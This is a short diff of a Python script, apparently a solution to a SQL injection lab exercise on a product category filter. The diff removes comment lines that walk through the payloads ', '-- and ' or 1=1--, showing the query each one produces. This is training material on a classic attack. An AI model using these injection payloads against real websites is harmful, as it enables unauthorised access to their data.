@@ -28,21 +28,3 @@ if __name__ == "__main__":
         print("[-] Usage: %s <url> <category>" % sys.argv[0])
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0]) 
         sys.exit(-1)
-
-
-# SQL injection - product category filter
-# SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
-# Display all products both released and unreleased.
-
-# Analysis:
-# SELECT * FROM products WHERE category = 'Pets' AND released = 1
-
-# ' Gives us an internal error, it becomes the second '
-# SELECT * FROM products WHERE category = ''' AND released = 1 
-
-#'-- Gives us nothing back, ' becomes the second ' and the rest gets commented out
-# SELECT * FROM products WHERE category = ''--' AND released = 1 
-# SELECT * FROM products WHERE category = ''
-
-#' or 1=1-- Performs injection, ' becomes the second ' or 1=1 and the rest gets commented out
-# SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
